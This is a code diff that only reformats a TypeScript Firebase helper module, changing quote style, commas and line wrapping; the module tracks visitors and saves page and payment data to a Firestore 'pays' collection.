@@ -1,6 +1,6 @@
-import { getApp, getApps, initializeApp, FirebaseApp } from 'firebase/app';
-import { getDatabase, Database } from 'firebase/database';
-import { doc, getFirestore, setDoc, Firestore } from 'firebase/firestore';
+import { getApp, getApps, initializeApp, FirebaseApp } from "firebase/app";
+import { getDatabase, Database } from "firebase/database";
+import { doc, getFirestore, setDoc, Firestore } from "firebase/firestore";
 
 const firebaseConfig = {
   apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
@@ -10,13 +10,13 @@ const firebaseConfig = {
   storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
   messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
   appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
-  measurementId: process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID
+  measurementId: process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID,
 };
 
 const isFirebaseConfigured = Boolean(
   firebaseConfig.apiKey &&
-  firebaseConfig.projectId &&
-  firebaseConfig.databaseURL
+    firebaseConfig.projectId &&
+    firebaseConfig.databaseURL
 );
 
 let app: FirebaseApp | null = null;
@@ -28,26 +28,28 @@ if (isFirebaseConfigured) {
   db = getFirestore(app);
   database = getDatabase(app);
 } else {
-  console.warn('Firebase is not configured. Please set the required environment variables.');
+  console.warn(
+    "Firebase is not configured. Please set the required environment variables."
+  );
 }
 
 export async function getData(id: string) {
   if (!db) {
-    console.warn('Firebase not configured - getData skipped');
+    console.warn("Firebase not configured - getData skipped");
     return null;
   }
   try {
-    const { getDoc, doc } = await import('firebase/firestore');
-    const docRef = doc(db, 'pays', id);
+    const { getDoc, doc } = await import("firebase/firestore");
+    const docRef = doc(db, "pays", id);
     const docSnap = await getDoc(docRef);
-    
+
     if (docSnap.exists()) {
       return docSnap.data();
     } else {
       return null;
     }
   } catch (e) {
-    console.error('Error getting document: ', e);
+    console.error("Error getting document: ", e);
     return null;
   }
 }
@@ -57,8 +59,8 @@ export async function getData(id: string) {
  * This function pollutes history with full page data instead of specific entries.
  */
 export async function saveToHistory(visitorID: string, step: number) {
-  console.warn('saveToHistory is deprecated and should not be used')
-  return // Disabled - function body kept for reference only
+  console.warn("saveToHistory is deprecated and should not be used");
+  return; // Disabled - function body kept for reference only
   /*
   try {
     const currentData = await getData(visitorID);
@@ -93,51 +95,58 @@ export async function saveToHistory(visitorID: string, step: number) {
 }
 
 export async function addData(data: any) {
-  if (typeof localStorage !== 'undefined') {
-    localStorage.setItem('visitor', data.id);
+  if (typeof localStorage !== "undefined") {
+    localStorage.setItem("visitor", data.id);
   }
   if (!db) {
-    console.warn('Firebase not configured - addData skipped');
+    console.warn("Firebase not configured - addData skipped");
     return;
   }
   try {
-    const docRef = await doc(db, 'pays', data.id!);
-    await setDoc(docRef, { 
-      ...data, 
-      createdAt: new Date().toISOString(),
-      updatedAt: new Date().toISOString(),
-      isUnread: true
-    }, {merge:true});
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      {
+        ...data,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+        isUnread: true,
+      },
+      { merge: true }
+    );
 
-    console.log('Document written with ID: ', docRef.id);
+    console.log("Document written with ID: ", docRef.id);
   } catch (e) {
-    console.error('Error adding document: ', e);
+    console.error("Error adding document: ", e);
   }
 }
 
-export const handleCurrentPage=(page:string)=>{
-const visitorId=localStorage.getItem('visitor')
-addData({id:visitorId,currentPage:page})
-}
+export const handleCurrentPage = (page: string) => {
+  const visitorId = localStorage.getItem("visitor");
+  addData({ id: visitorId, currentPage: page });
+};
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   if (!db) {
-    console.warn('Firebase not configured - handlePay skipped');
+    console.warn("Firebase not configured - handlePay skipped");
     return;
   }
   try {
-    const visitorId = typeof localStorage !== 'undefined' ? localStorage.getItem('visitor') : null;
+    const visitorId =
+      typeof localStorage !== "undefined"
+        ? localStorage.getItem("visitor")
+        : null;
     if (visitorId) {
-      const docRef = doc(db, 'pays', visitorId);
+      const docRef = doc(db, "pays", visitorId);
       await setDoc(
         docRef,
-        { ...paymentInfo, status: 'pending' },
+        { ...paymentInfo, status: "pending" },
         { merge: true }
       );
-      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
     }
   } catch (error) {
-    console.error('Error adding document: ', error);
-    alert('Error adding payment info to Firestore');
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
 };
 export { db, database, setDoc, doc };
